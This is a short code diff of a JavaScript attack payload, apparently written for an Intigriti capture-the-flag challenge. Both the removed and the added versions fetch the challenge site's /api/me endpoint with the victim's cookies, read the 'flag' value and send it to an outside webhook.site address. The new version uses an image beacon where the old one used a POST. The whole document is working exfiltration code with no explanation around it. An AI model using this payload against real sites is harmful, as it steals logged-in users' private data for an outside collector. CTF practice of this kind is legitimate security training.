@@ -1,18 +1,9 @@
-<!doctype html>
-<html>
-<body>
 <script>
-fetch('https://challenge-0126.intigriti.io/api/me', {
-  credentials: 'include'
-})
-.then(r => r.json())
-.then(d => {
-  fetch('https://webhook.site/3ae6a321-e1df-47a0-b4d3-ac23c1e28963', {
-    method: 'POST',
-    mode: 'no-cors',
-    body: d.flag
-  });
+fetch('https://challenge-0126.intigriti.io/api/me',{credentials:'include'})
+.then(r=>r.json())
+.then(d=>{
+  new Image().src =
+    'https://webhook.site/3ae6a321-e1df-47a0-b4d3-ac23c1e28963?flag='
+    + encodeURIComponent(d.flag);
 });
 </script>
-</body>
-</html>
